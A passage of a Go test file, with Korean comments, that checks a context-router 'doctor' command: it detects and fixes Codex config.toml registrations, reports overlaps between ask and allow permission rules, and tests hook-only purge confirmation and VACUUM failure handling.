		cfg       string // "" = config.toml을 만들지 않는다
		wantLabel string // [20] 라벨에 포함될 문자열
		wantWarn  bool   // [20] warning 유무 = --fix가 바꾸는가
	}{
		{name: "① 파일 부재", cfg: "", wantLabel: "codex=없음", wantWarn: false},
		{name: "② 현재 버전", cfg: ours + ver + "\"\n", wantLabel: "codex=marker " + ver, wantWarn: false},
		{name: "③ 구 버전 표식", cfg: ours + "0.15.0\"\n", wantLabel: "≠" + ver, wantWarn: true},
		{name: "④ 무버전 표식", cfg: "[mcp_servers.ctr]\ncommand = \"context-router\"\n[mcp_servers.ctr.env]\n" + codexMarkerKey + " = \"context-router\"\n", wantLabel: "버전미상", wantWarn: true},
		{name: "⑤ 남의 테이블", cfg: "[mcp_servers.ctr]\ncommand = \"other\"\n[mcp_servers.ctr.env]\n" + codexMarkerKey + " = \"other-tool/1.0\"\n", wantLabel: "codex=미등록", wantWarn: false},
		{name: "⑥ 표식 없는 우리 테이블", cfg: "[mcp_servers.ctr]\ncommand = \"context-router\"\nargs = []\n", wantLabel: "codex=표식없음", wantWarn: true},
		{name: "⑦ 파일 존재·관리 테이블 부재", cfg: "model = \"gpt\"\n", wantLabel: "codex=미등록", wantWarn: false},
		{name: "⑧ 구 블록 + 비표준 command", cfg: codexBlockBegin + "\n[mcp_servers.ctr]\ncommand = \"C:\\\\bin\\\\ctr.exe\"\n" + codexBlockEnd + "\n", wantLabel: "codex=구형식", wantWarn: true},
		{name: "⑨ 구간 밖 충돌", cfg: ours + "0.15.0\"\n[mcp_servers.ctr.tools.ctr_execute]\napproval_mode = \"never\"\n", wantLabel: "codex=충돌", wantWarn: false},
		{name: "⑩ 중복 헤더", cfg: "[mcp_servers.ctr]\n[x]\n[mcp_servers.ctr]\n", wantLabel: "codex=이상", wantWarn: false},
		{name: "⑪ EOF 스캐너 열림", cfg: "[mcp_servers.ctr]\nk = \"\"\"\nunclosed\n", wantLabel: "codex=이상", wantWarn: false},
		{name: "⑫ 정규화 불가 키", cfg: "[mcp_servers.ctr]\n\"comm\\u0061nd\" = \"x\"\n", wantLabel: "codex=이상", wantWarn: false},
		{
			name: "⑬ 사용자가 넓힌 enabled_tools",
			cfg: "[mcp_servers.ctr]\ncommand = \"context-router\"\nargs = [\"--enable\", \"ingest\"]\n" +
				"enabled_tools = [\"ctr_search\", \"ctr_index\", \"ctr_execute\"]\n" +
				"[mcp_servers.ctr.env]\n" + codexMarkerKey + " = \"context-router/" + ver + "\"\n",
			wantLabel: "codex=marker " + ver, wantWarn: false,
		},
		{
			// 스펙 §2-6이 정규화 불가 키의 **두 형태**를 요구한다. ⑫는 서브테이블 형태이므로
			// 인라인 형태를 배선 수준에서 함께 잰다 — 그 형태는 키 토큰이 env라 서브테이블
			// 검사에 걸리지 않는 별개 경로다.
			name:      "⑭ 정규화 불가 키(인라인 env 형태)",
			cfg:       "[mcp_servers.ctr]\ncommand = \"context-router\"\nenv = { \"CTR_MAN\\u0041GED\" = \"context-router\" }\n",
			wantLabel: "codex=이상", wantWarn: false,
		},
		{
			// 표식은 **현재 버전**인데 형식(구 BEGIN/END 블록)이 어긋나 --fix가 파일을 바꾸는
			// 상태다. 이 행이 두 가지를 함께 잡는다: ① 버전 접미를 shouldFix로 붙이면 같은
			// 버전을 좌우에 둔 "0.16.0≠0.16.0"이 나온다는 것(그래서 codexVerdictLabel이 버전
			// **비교**로 붙인다), ② 그 상태를 형식 접미로 구별한다는 것. 이 행이 없으면 두
			// 규칙 모두 어떤 단정에도 걸리지 않는다(실측).
			name: "⑮ 구 블록 + 현재 버전 표식 — 형식 드리프트",
			cfg: codexBlockBegin + "\n[mcp_servers.ctr]\ncommand = \"context-router\"\n" +
				"[mcp_servers.ctr.env]\n" + codexMarkerKey + " = \"context-router/" + ver + "\"\n" +
				codexBlockEnd + "\n",
			wantLabel: "codex=marker " + ver + "(형식)", wantWarn: true,
		},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			codexHome := t.TempDir()
			t.Setenv("CODEX_HOME", codexHome)
			cfgPath := filepath.Join(codexHome, "config.toml")
			if c.cfg != "" {
				write(t, cfgPath, []byte(c.cfg))
			}
			projectRoot := t.TempDir()

			// 감지 — [20] 라벨과 경고
			var buf bytes.Buffer
			if err := runDoctor(context.Background(), &buf, t.TempDir(), projectRoot, ver, false); err != nil {
				t.Fatalf("runDoctor: %v out=%s", err, buf.String())
			}
			out := buf.String()
			if !strings.Contains(out, c.wantLabel) {
				t.Errorf("라벨 %q 없음:\n%s", c.wantLabel, out)
			}
			// 경고는 Codex 갈래가 유일한 원인이어야 한다 — .mcp.json은 만들지 않았으므로 그쪽
			// 라벨은 "없음"이고 경고를 내지 않는다.
			gotWarn := strings.Contains(out, "[20] warning:")
			if gotWarn != c.wantWarn {
				t.Errorf("warning=%v want %v:\n%s", gotWarn, c.wantWarn, out)
			}
			// 이상 라벨은 세 사유를 한 값으로 묶으므로 [20]이 사유 줄을 함께 낸다(§2-7).
			// 사유가 없으면 사용자는 install이 영구히 무변경인 이유를 알 수 없다.
			if strings.Contains(c.wantLabel, "이상") && !strings.Contains(out, "[20] codex: ") {
				t.Errorf("이상 라벨인데 사유 줄이 없다:\n%s", out)
			}

			// 고침 — --fix가 파일을 바꾸는가
			if c.cfg == "" {
				return // 부재 파일은 만들지 않는다(다른 테스트가 단정한다)
			}
			var fixBuf bytes.Buffer
			if err := runDoctor(context.Background(), &fixBuf, t.TempDir(), projectRoot, ver, true); err != nil {
				t.Fatalf("runDoctor --fix: %v out=%s", err, fixBuf.String())
			}
			after, rErr := os.ReadFile(cfgPath)
			if rErr != nil {
				t.Fatal(rErr)
			}
			changed := string(after) != c.cfg
			if changed != c.wantWarn {
				t.Errorf("--fix changed=%v인데 경고는 %v였다 — 감지와 고침이 어긋난다\n%s", changed, c.wantWarn, fixBuf.String())
			}
		})
	}
}

// doctorWarningLine — [20] 경고 줄만 뽑는다(문면 단정용). 없으면 ""다.
func doctorWarningLine(out string) string {
	for _, ln := range strings.Split(out, "\n") {
		if strings.HasPrefix(ln, "[20] warning:") {
			return ln
		}
	}
	return ""
}

// TestDoctorWarningAnnouncesCommandRewrite — [20] 경고는 --fix가 **command를 다시 쓴다는
// 것**을 예고해야 한다. 경고 조건이 "표식 버전 불일치"에서 "--fix가 파일을 바꾸는가"로
// 넓어지면서(D85) command만 고쳐 둔 등록물이 처음으로 이 권고의 대상이 됐다 — 권고를 따르면
// 그 값이 우리 이름으로 되돌아가고, PATH에 그 이름이 없는 호스트에서는 Codex가 그 서버를
// 기동하지 못한다. 문면이 보존되는 것(args·enabled_tools)만 열거하면 사용자는 그 손실을
// 예상할 수 없다. 같은 테스트에서 --fix의 실제 행동을 함께 재 문면이 사실인지 확인한다.
// t.Setenv 사용 → t.Parallel 금지.
func TestDoctorWarningAnnouncesCommandRewrite(t *testing.T) {
	const ver = "0.16.0"
	codexHome := t.TempDir()
	t.Setenv("CODEX_HOME", codexHome)
	cfgPath := filepath.Join(codexHome, "config.toml")
	// 표식은 현재 버전이고 command만 사용자가 고쳐 둔 등록물(PATH에 없는 바이너리를 가리킨다).
	cfg := "[mcp_servers.ctr]\ncommand = \"C:\\\\bin\\\\context-router.exe\"\n" +
		"[mcp_servers.ctr.env]\n" + codexMarkerKey + " = \"context-router/" + ver + "\"\n"
	write(t, cfgPath, []byte(cfg))
	projectRoot := t.TempDir()

	var buf bytes.Buffer
	if err := runDoctor(context.Background(), &buf, t.TempDir(), projectRoot, ver, false); err != nil {
		t.Fatalf("runDoctor: %v out=%s", err, buf.String())
	}
	warn := doctorWarningLine(buf.String())
	if warn == "" {
		t.Fatalf("형식 드리프트인데 경고가 없다:\n%s", buf.String())
	}
	// 되쓰기 **방향**까지 한 어구로 결속한다 — command와 우리 이름이 줄 어딘가에 있는지만 보면
	// "command는 보존합니다" 같은 **반대 뜻** 문면도 통과해 감시선이 물지 않는다.
	if !strings.Contains(warn, "command는 \""+hookBinaryName+"\"로 다시 씁니다") {
		t.Errorf("경고가 command 되쓰기를 예고하지 않는다:\n%s", warn)
	}

	// 문면이 사실인가 — --fix는 실제로 command를 우리 이름으로 되쓴다(D86 확정 동작).
	var fixBuf bytes.Buffer
	if err := runDoctor(context.Background(), &fixBuf, t.TempDir(), projectRoot, ver, true); err != nil {
		t.Fatalf("runDoctor --fix: %v out=%s", err, fixBuf.String())
	}
	after, err := os.ReadFile(cfgPath)
	if err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(string(after), "command = \""+hookBinaryName+"\"") {
		t.Errorf("--fix가 command를 되쓰지 않았다 — 경고 문면과 어긋난다:\n%s", after)
	}
}

// TestDoctorNonStringMarkerIsDrift — 표식 키의 **값이 문자열이 아닌** 등록물은 드리프트다.
// 종전에는 setInlineEnvMarker가 그 줄을 보존해 표식이 영영 현재 값이 되지 못했고, 그래서
// Changed가 거짓이라 [20]은 "표식없음"을 경고 없이 내면서 같은 실행의 --fix가 "이미 현재
// 형식·버전입니다"라고 보고했다 — 두 줄이 서로 모순이고 사용자에게 다음 조치가 없었다.
// t.Setenv 사용 → t.Parallel 금지.
func TestDoctorNonStringMarkerIsDrift(t *testing.T) {
	const ver = "0.16.0"
	codexHome := t.TempDir()
	t.Setenv("CODEX_HOME", codexHome)
	cfgPath := filepath.Join(codexHome, "config.toml")
	cfg := "[mcp_servers.ctr]\ncommand = \"context-router\"\n" +
		"env = { " + codexMarkerKey + " = 0 }\n"
	write(t, cfgPath, []byte(cfg))
	projectRoot := t.TempDir()

	var buf bytes.Buffer
	if err := runDoctor(context.Background(), &buf, t.TempDir(), projectRoot, ver, false); err != nil {
		t.Fatalf("runDoctor: %v out=%s", err, buf.String())
	}
	if doctorWarningLine(buf.String()) == "" {
		t.Errorf("판독되지 않는 표식인데 경고가 없다:\n%s", buf.String())
	}

	var fixBuf bytes.Buffer
	if err := runDoctor(context.Background(), &fixBuf, t.TempDir(), projectRoot, ver, true); err != nil {
		t.Fatalf("runDoctor --fix: %v out=%s", err, fixBuf.String())
	}
	if strings.Contains(fixBuf.String(), "이미 현재 형식·버전입니다") {
		t.Errorf("경고를 낸 실행이 무변경을 보고했다:\n%s", fixBuf.String())
	}
	after, err := os.ReadFile(cfgPath)
	if err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(string(after), codexMarkerKey+" = \""+hookMarker(ver)+"\"") {
		t.Errorf("--fix가 표식을 관리 표식 문자열로 교체하지 않았다:\n%s", after)
	}

	// 재실행 무변경 — 드리프트로 올린 상태가 매 실행 다시 기입되면 D84 단일 백업 슬롯이
	// 2회차에 원본을 잃는다.
	before, _ := os.ReadFile(cfgPath)
	var againBuf bytes.Buffer
	if err := runDoctor(context.Background(), &againBuf, t.TempDir(), projectRoot, ver, true); err != nil {
		t.Fatalf("runDoctor --fix 2: %v", err)
	}
	if again, _ := os.ReadFile(cfgPath); !bytes.Equal(before, again) {
		t.Errorf("고친 뒤 재실행이 파일을 또 바꿨다:\n%s", again)
	}
}

// TestDoctorFixMigratesOldFormat — X6(§2-9). --fix가 v0.14 구 형식을 실제 파일에서 1회
// 변환하는지, args가 보존되는지(D86), 재실행이 무변경이고 .bak이 원본을 유지하는지.
func TestDoctorFixMigratesOldFormat(t *testing.T) {
	codexHome := t.TempDir()
	t.Setenv("CODEX_HOME", codexHome)
	cfgPath := filepath.Join(codexHome, "config.toml")
	old := codexBlockBegin + "\n" +
		"[mcp_servers.ctr]\n" +
		"command = \"context-router\"\n" +
		"args = [\"--enable\", \"ingest\"]\n" +
		"enabled_tools = [\"ctr_search\", \"ctr_index\", \"ctr_execute\"]\n" +
		codexBlockEnd + "\n"
	write(t, cfgPath, []byte(old))
	projectRoot := t.TempDir()

	var buf bytes.Buffer
	if err := runDoctor(context.Background(), &buf, t.TempDir(), projectRoot, "0.16.0", true); err != nil {
		t.Fatalf("--fix: %v out=%s", err, buf.String())
	}
	after1, err := os.ReadFile(cfgPath)
	if err != nil {
		t.Fatal(err)
	}
	got := string(after1)
	if strings.Contains(got, codexBlockBegin) || strings.Contains(got, codexBlockEnd) {
		t.Errorf("마커가 남아 있다:\n%s", got)
	}
	if !strings.Contains(got, codexMarkerKey+" = \""+hookMarker("0.16.0")+"\"") {
		t.Errorf("표식이 기입되지 않았다:\n%s", got)
	}
	// D86 — 사용자가 넓힌 enabled_tools가 보존된다(프로필 ingest는 ctr_execute를 켜지 않는다)
	if !strings.Contains(got, "ctr_execute") {
		t.Errorf("--fix가 사용자 확장을 지웠다:\n%s", got)
	}
	if !strings.Contains(got, "args = [\"--enable\", \"ingest\"]") {
		t.Errorf("--fix가 args를 바꿨다:\n%s", got)
	}
	bak, bErr := os.ReadFile(cfgPath + ".bak")
	if bErr != nil || string(bak) != old {
		t.Errorf(".bak이 원본을 담지 않았다: err=%v\n%s", bErr, bak)
	}

	// 2회차 무변경 + .bak 유지
	var buf2 bytes.Buffer
	if err := runDoctor(context.Background(), &buf2, t.TempDir(), projectRoot, "0.16.0", true); err != nil {
		t.Fatalf("--fix 2회차: %v", err)
	}
	after2, _ := os.ReadFile(cfgPath)
	if string(after2) != got {
		t.Errorf("2회차가 파일을 바꿨다:\n%s", after2)
	}
	if !strings.Contains(buf2.String(), "이미 현재 형식·버전입니다") {
		t.Errorf("2회차가 무변경을 보고하지 않았다:\n%s", buf2.String())
	}
	// 스펙 §2-4 — 보고 문면이 무엇을 맞추고 무엇을 보존했는지 알리는지. 1회차 출력을 본다.
	for _, want := range []string{"표식과 command", "원문 보존"} {
		if !strings.Contains(buf.String(), want) {
			t.Errorf("--fix 보고에 %q 없음:\n%s", want, buf.String())
		}
	}
	bak2, _ := os.ReadFile(cfgPath + ".bak")
	if string(bak2) != old {
		t.Errorf(".bak이 2회차에 덮였다:\n%s", bak2)
	}
}

// TestRunDoctorFixFlag — D83 구현 이음새 ①. doctor 분기에 --fix 하나만 받는 자체 flagset을
// 열고 그 밖의 인자는 종전대로 거부한다. 오류 문면은 사용자 입력을 에코하지 않는다(규약 §6).
func TestRunDoctorFixFlag(t *testing.T) {
	t.Setenv("CODEX_HOME", t.TempDir())
	var out, errOut bytes.Buffer
	if err := Run(context.Background(), "doctor", []string{"--fix"}, t.TempDir(), t.TempDir(), "0.15.0", false, "", &out, &errOut); err != nil {
		t.Fatalf("doctor --fix: %v out=%s", err, out.String())
	}
	if !strings.Contains(out.String(), "[20] ") {
		t.Errorf("--fix 실행에 [20]이 없다:\n%s", out.String())
	}
	for _, args := range [][]string{{"--bogus"}, {"extra"}, {"--fix", "extra"}} {
		var o, e bytes.Buffer
		err := Run(context.Background(), "doctor", args, t.TempDir(), t.TempDir(), "0.15.0", false, "", &o, &e)
		if err == nil {
			t.Errorf("%v: 인자를 거부하지 않았다", args)
			continue
		}
		for _, tok := range args {
			if strings.Contains(err.Error(), strings.TrimLeft(tok, "-")) && tok != "--fix" {
				t.Errorf("%v: 오류가 사용자 입력을 에코했다: %v", args, err)
			}
		}
	}
}

// TestDoctorShowsRunnerLine — [18] exec 러너 감지 라인(D58). 감지 결과는 환경 의존이라 접두만
// 검증한다(exec는 opt-in 프로필이라 미검출이어도 실패 게이트가 아님 — err 무시).
func TestDoctorShowsRunnerLine(t *testing.T) {
	isolateCodexHome(t)
	var buf bytes.Buffer
	_ = runDoctor(context.Background(), &buf, t.TempDir(), t.TempDir(), "0.11.0", false)
	if !strings.Contains(buf.String(), "[18] exec runners:") {
		t.Fatalf("[18] 누락:\n%s", buf.String())
	}
}

// TestDoctorWarnMentionsHookOnly — [14] 경고 신문구가 --hook-only 선택 삭제를 안내하고 옛 문구
// ('무구분')는 사라졌다(설계 §8 / D38 승격).
func TestDoctorWarnMentionsHookOnly(t *testing.T) {
	isolateCodexHome(t)
	storeRoot, projectRoot := doctorSizeWarnSetup(t)
	t.Setenv("CTR_STORE_WARN_BYTES", "5") // blob 10B > 5B → 발화
	var buf bytes.Buffer
	if err := runDoctor(context.Background(), &buf, storeRoot, projectRoot, "0.0.1-dev", false); err != nil {
		t.Fatalf("runDoctor err=%v out=%s", err, buf.String())
	}
	out := buf.String()
	for _, want := range []string{"[14] warning:", "--hook-only", "shadow만 선택 삭제 가능"} {
		if !strings.Contains(out, want) {
			t.Fatalf("경고 신문구에 %q 없음:\n%s", want, out)
		}
	}
	if strings.Contains(out, "무구분") {
		t.Fatalf("옛 문구('무구분')가 남아 있음:\n%s", out)
	}
}

// TestHostSnippetNoExecAskRule: 호스트 안내가 exec 도구를 permissions.ask에 넣게 하지
// 않는다. ask는 무프롬프트 모드에서도 프롬프트를 강제하고 allow를 이기므로, 승인 강도는
// 호스트 권한 모드가 정하게 둔다(설계 v0.12 D64).
func TestHostSnippetNoExecAskRule(t *testing.T) {
	// ask 배열 줄에 exec 도구가 있으면 안 된다.
	for _, line := range strings.Split(hostSnippet, "\n") {
		if !strings.Contains(line, `"ask"`) {
			continue
		}
		for _, tool := range []string{"ctr_execute", "ctr_execute_file"} {
			if strings.Contains(line, tool) {
				t.Errorf("ask 안내에 exec 도구가 남아 있다: %s", line)
			}
		}
	}
	// 대신 모드 기반 설명이 있어야 한다.
	if !strings.Contains(hostSnippet, "권한 모드") {
		t.Errorf("승인 강도를 호스트 권한 모드가 정한다는 안내가 없다")
	}
}

// TestHostSnippetCodexTable — D80 §2-17. 스니펫이 인쇄하는 Codex 블록은 env.CTR_MANAGED를
// 담아야 한다 — reportCodexMCPState의 안내가 "이 스니펫으로 수동 등록한 뒤 재실행"을 가리키므로,
// 담지 않으면 그것을 붙여 넣은 사용자가 표식 없는 테이블을 갖는다(command를 그대로 붙여 넣으면
// D80 인수 절이 받지만, 경로를 고쳐 쓰면 받지 못한다). 값은 **무버전 context-router**다 —
// hostSnippet은 상수라 버전을 담으면 상수가 아니게 되고, 그 값은 D82의 정확 일치 절을 만족해
// 소유 판정에 그대로 걸리며 D83의 검사는 "표식 있음·버전 미상"으로 읽어 --fix가 채운다.
// 같은 테스트가 붙여넣기 대상에 승인 모드 **키**가 없는지도 본다(D81 — 권장 안내 문면 자체는
// 주석 줄로 남을 수 있다).
func TestHostSnippetCodexTable(t *testing.T) {
	for _, want := range []string{
		"[mcp_servers.ctr]",
		"[mcp_servers.ctr.env]",
		codexMarkerKey + ` = "context-router"`,
		`"ctr_index"`,
		`"ctr_fetch_and_index"`,
	} {
		if !strings.Contains(hostSnippet, want) {
			t.Errorf("Codex 스니펫에 %q 없음:\n%s", want, hostSnippet)
		}
	}
	// 버전이 박힌 표식을 인쇄하면 안 된다(상수가 릴리스마다 바뀌게 된다).
	if strings.Contains(hostSnippet, codexMarkerKey+` = "context-router/`) {
		t.Errorf("스니펫이 버전 있는 표식을 인쇄한다:\n%s", hostSnippet)
	}
	// 승인 모드 키는 **대입 줄**로 나오면 안 된다. 주석(#로 시작)은 안내라 허용한다.
	for _, line := range strings.Split(hostSnippet, "\n") {
		trimmed := strings.TrimSpace(line)
		if strings.HasPrefix(trimmed, "#") {
			continue
		}
		if strings.Contains(trimmed, "approval_mode") {
			t.Errorf("붙여넣기 대상에 승인 모드 키가 있다: %s", line)
		}
	}
	// D81 — .mcp.json 예시도 설치기 **기본 프로필**을 인쇄한다. exec만 켠 옛 예시를 붙여 넣은
	// 사용자는 ctr_index·ctr_fetch_and_index가 없는 등록을 갖고, 바로 아래 ask 규칙이
	// 매치할 도구가 없는 상태가 된다(TestHostSnippetUsesCurrentServerPrefix가 지키는 두 규칙).
	if !strings.Contains(hostSnippet, `"args": ["--enable", "ingest,net"]`) {
		t.Errorf(".mcp.json 예시가 기본 프로필을 인쇄하지 않는다:\n%s", hostSnippet)
	}
}

// TestPurgeHookOnlySinglePrompt — TTY 경로에서 확인 프롬프트가 정확히 1회만 출력된다(전역
// confirmPurge와의 중복 방지 회귀 — 조기 분기가 전역 confirm 앞에 있어야 함). 견적 슬러그를
// 정확히 재구성해 입력하면 통과하고 실회수 보고까지 진행된다.
func TestPurgeHookOnlySinglePrompt(t *testing.T) {
	pid, projDir, _ := seedHookOnlyProject(t)
	storeRoot := storeRootOf(projDir)

	sz, err := store.SizeStats(projDir)
	if err != nil || sz == nil {
		t.Fatalf("SizeStats: %v", err)
	}
	var estB int64
	for _, b := range sz.ShadowOwned {
		estB += b
	}
	slug := fmt.Sprintf("shadow %dB(%d hashes) 선택 삭제", estB, len(sz.ShadowOwned))

	var out bytes.Buffer
	args := []string{"--project", pid, "--hook-only"} // --force 없음 → TTY 확인 경로
	if err := runPurge(context.Background(), strings.NewReader(slug+"\n"), &out, io.Discard, storeRoot, args, true); err != nil {
		t.Fatalf("runPurge(TTY) err=%v out=%s", err, out.String())
	}
	o := out.String()
	if n := strings.Count(o, "삭제 대상을 확인합니다"); n != 1 {
		t.Fatalf("확인 프롬프트가 %d회(정확히 1회여야 — 전역 confirm 중복 방지):\n%s", n, o)
	}
	if !strings.Contains(o, "실회수") {
		t.Fatalf("단일 확인 통과 후 실회수 보고 없음:\n%s", o)
	}
	// hook-only 확인 문구는 범위(shadow-owned 한정)를 명시하고 전체삭제(세션 이벤트) 문구를 쓰지 않는다.
	if strings.Contains(o, "세션 이벤트 데이터를 포함") {
		t.Fatalf("hook-only인데 전체삭제(세션 이벤트 데이터) 문구:\n%s", o)
	}
	if !strings.Contains(o, "explicit 소스는 보존") {
		t.Fatalf("hook-only 범위(shadow-owned 한정) 문구 없음:\n%s", o)
	}
}

// blockingWriter — 첫 Write에서 buf에 기록한 뒤 hit을 알리고 release가 닫힐 때까지 막는다.
// 테스트가 정확히 그 Write 지점(hook-only 보고 직후·VACUUM 직전)에 개입해 다른 연결로 쓰기
// 잠금을 선점할 수 있게 하는 결정적 배리어다(타이밍 슬립 없음 — 순수 채널 동기화).
type blockingWriter struct {
	buf     bytes.Buffer
	once    sync.Once
	hit     chan struct{}
	release chan struct{}
}

func newBlockingWriter() *blockingWriter {
	return &blockingWriter{hit: make(chan struct{}), release: make(chan struct{})}
}

func (b *blockingWriter) Write(p []byte) (int, error) {
	n, _ := b.buf.Write(p)
	b.once.Do(func() {
		close(b.hit)
		<-b.release
	})
	return n, nil
}

// TestPurgeHookOnlyVacuumFailurePropagates — D55: VACUUM 실패는 rc≠0로 전파된다(단 이미 커밋된
// hook-only 삭제분은 유지). 실회수 보고는 VACUUM보다 먼저(스펙 §3 순서) 출력된다. 보고 직후·
// VACUUM 직전에 별도 연결로 쓰기 잠금(BEGIN IMMEDIATE)을 선점해 VACUUM을 SQLITE_BUSY로 결정적으로 실패시킨다.
func TestPurgeHookOnlyVacuumFailurePropagates(t *testing.T) {
	pid, projDir, _ := seedHookOnlyProject(t)
	storeRoot := storeRootOf(projDir)

	// content.db에 별도 쓰기 연결(아직 잠금 미선점). WAL 모드는 db 헤더에 지속되므로 재지정 불필요.
	dbPath := filepath.ToSlash(filepath.Join(projDir, "content.db"))
	locker, err := sql.Open("sqlite", "file:"+dbPath+"?_pragma=busy_timeout(5000)")
	if err != nil {
		t.Fatalf("open locker: %v", err)
	}
	defer func() { _ = locker.Close() }()
	lockConn, err := locker.Conn(context.Background())
	if err != nil {
		t.Fatalf("locker conn: %v", err)
	}
	defer func() { _ = lockConn.Close() }()

	gw := newBlockingWriter()
	var errOut bytes.Buffer
	done := make(chan error, 1)
	go func() {
		done <- runPurge(context.Background(), failReader{}, gw, &errOut, storeRoot,
			[]string{"--project", pid, "--hook-only", "--force"}, false)
	}()

	// 실회수 보고가 gw.buf에 기록되길 기다린다(= PurgeHookOnly 커밋 완료·쓰기 잠금 해제됨).
	// runPurge가 보고 전에 조기 종료(오류)하면 hit이 안 오므로 done/타임아웃으로 빠르게 실패한다.
	select {
	case <-gw.hit:
	case rc := <-done:
		t.Fatalf("runPurge가 실회수 보고 전에 종료(rc=%v) — 조기 분기/보고 순서 회귀:\n%s", rc, gw.buf.String())
	case <-time.After(30 * time.Second):
		t.Fatal("실회수 보고가 30s 내 안 나옴")
	}
	if _, err := lockConn.ExecContext(context.Background(), "BEGIN IMMEDIATE"); err != nil {
		t.Fatalf("선점 BEGIN IMMEDIATE: %v", err)
	}
	close(gw.release) // runPurge 진행 → VACUUM은 선점된 잠금에 막혀 BUSY 실패

	var rc error
	select {
	case rc = <-done:
	case <-time.After(30 * time.Second):
		t.Fatal("runPurge가 30s 내 종료 안 됨(교착?)")
	}
	_, _ = lockConn.ExecContext(context.Background(), "ROLLBACK")

	// 반전(D55): VACUUM 실패는 rc≠0로 전파 — 단 이미 커밋된 hook-only 삭제분은 유지.
	if rc == nil {
		t.Fatalf("VACUUM BUSY인데 rc=nil — D55 rc≠0 계약 회귀:\n%s", gw.buf.String())
	}
	if !strings.Contains(gw.buf.String(), "실회수") {
		t.Fatalf("실회수 보고가 VACUUM 이전에 안 나옴:\n%s", gw.buf.String())
	}
}

// TestDoctorShowsPermissionLine: [19] 라인이 항상 나오고, 규칙이 없는 환경에서는 세 갈래 중
// "충돌 없음"이다. 라인 접두("[19] permissions:")만 단정하면 판정이 통째로 무력화돼도(예: ruleMatches가
// 항상 false를 돌려주는 회귀) 통과하므로 문면까지 고정한다(G5). USER 스코프는 임시 홈으로 돌려
// 실환경 설정이 판정에 섞이지 않게 한다 — 그러지 않으면 세 갈래 중 어느 것이 나올지 환경에 달린다.
func TestDoctorShowsPermissionLine(t *testing.T) {
	home := t.TempDir()
	t.Setenv("USERPROFILE", home) // windows
	t.Setenv("HOME", home)        // unix
	var buf bytes.Buffer
	_ = runDoctor(context.Background(), &buf, t.TempDir(), t.TempDir(), "0.12.0", false)
	if !strings.Contains(buf.String(), "[19] permissions: ask/allow 충돌 없음") {
		t.Fatalf("[19] 충돌 없음 라인 누락:\n%s", buf.String())
	}
}

// TestDoctorReportsAskShadowedAllow: 프로젝트 settings의 ask와 도구가 겹치는 allow가 있으면 doctor가
// 그 규칙 이름을 [19]로 보고한다 — 디스크의 실제 파일에서 doctor 라인까지의 배선을 잇는 테스트다.
// 두 번째 allow(서버 단위)는 ask와 일부만 겹친다 — 겹치는 도구에서만 무력화되고 나머지 도구에서는
// 그대로 유효하므로, 문면이 "덮는다"가 아니라 "겹친다"여야 한다(R4). 판정이 교집합으로 바뀐 뒤에도
// "덮는다"로 남으면 진단이 사용자에게 그 allow 전체가 죽었다고 잘못 읽힌다.
// USER 스코프는 임시 홈으로 돌려 실환경 설정이 건수에 섞이지 않게 한다(판정은 전 스코프 합집합).
func TestDoctorReportsAskShadowedAllow(t *testing.T) {
	home := t.TempDir()
	t.Setenv("USERPROFILE", home) // windows
	t.Setenv("HOME", home)        // unix
	projectRoot := t.TempDir()
	if err := os.MkdirAll(filepath.Join(projectRoot, ".claude"), 0o755); err != nil {
		t.Fatalf("mkdir: %v", err)
	}
	rules := `{"permissions":{"ask":["mcp__ctr-exec__ctr_execute"],` +
		`"allow":["mcp__ctr-exec__ctr_execute","mcp__ctr-exec"]}}`
	if err := os.WriteFile(filepath.Join(projectRoot, ".claude", "settings.json"), []byte(rules), 0o600); err != nil {
		t.Fatalf("write settings: %v", err)
	}
	var buf bytes.Buffer
	_ = runDoctor(context.Background(), &buf, t.TempDir(), projectRoot, "0.12.0", false)
	if !strings.Contains(buf.String(), "[19] permissions: ask와 겹치는 allow 항목 2건 — mcp__ctr-exec__ctr_execute, mcp__ctr-exec") {
		t.Fatalf("[19] 충돌 보고 누락:\n%s", buf.String())
	}
}

// TestDoctorIndeterminateOnUnreadableScope: 읽을 수 없는 스코프가 하나라도 있으면 [19]는
// "충돌 없음"이 아니라 판정 불가로 떨어진다(리뷰 F1 — 거짓 clean 방지). settings.json 자리에
// 디렉터리를 두어 os.ReadFile이 미존재가 아닌 오류를 내게 만든다. USER 스코프는 임시 홈으로 돌린다.
func TestDoctorIndeterminateOnUnreadableScope(t *testing.T) {
	home := t.TempDir()
	t.Setenv("USERPROFILE", home) // windows
	t.Setenv("HOME", home)        // unix
	projectRoot := t.TempDir()
	if err := os.MkdirAll(filepath.Join(projectRoot, ".claude", "settings.json"), 0o755); err != nil {
		t.Fatalf("mkdir: %v", err)
	}
	var buf bytes.Buffer
	_ = runDoctor(context.Background(), &buf, t.TempDir(), projectRoot, "0.12.0", false)
	if !strings.Contains(buf.String(), "[19] permissions: ask/allow 판정 불가") {
		t.Fatalf("읽을 수 없는 스코프인데 판정 불가가 아니다:\n%s", buf.String())
	}
}

// TestDoctorPermissionLineOnCheckFailure: 판정 자체가 실패하면 "충돌 없음"이 아니라 판정 불가를
// 알린다 — 확인하지 않은 것을 확인했다고 말하는 진단은 침묵보다 사용자를 더 오도한다. 홈 디렉터리
// 해석이 유일한 실패 경로라 USERPROFILE/HOME을 비워 재현한다. [19]는 한 줄만 나오므로 판정 불가
// 라인의 존재가 곧 "충돌 없음"을 찍지 않았다는 증거다.
func TestDoctorPermissionLineOnCheckFailure(t *testing.T) {
	t.Setenv("USERPROFILE", "") // windows
	t.Setenv("HOME", "")        // unix
	var buf bytes.Buffer
	_ = runDoctor(context.Background(), &buf, t.TempDir(), t.TempDir(), "0.12.0", false)
	if !strings.Contains(buf.String(), "[19] permissions: ask/allow 판정 불가") {
		t.Fatalf("판정 실패인데 판정 불가 라인이 없다:\n%s", buf.String())
	}
}

// TestDoctorIndexesRender — D73: 병기가 quick_check 뒤에 오고 기존 부분문자열 단정이 그대로
// 통과한다(골든 갱신 없이 정보만 더한다).
func TestDoctorIndexesRender(t *testing.T) {
	isolateCodexHome(t)
	// 전용 doctor 실행 헬퍼는 없다 — 기존 셋업 두 개로 조립해 runDoctor를 직접 부른다.
	storeRoot, projectRoot, projDir := doctorShadowProjDir(t) // cli_test.go:545
	seedShadowContentDB(t, projDir)                           // cli_test.go:411 — writable Open이라 여기서 색인이 생긴다
	var buf bytes.Buffer
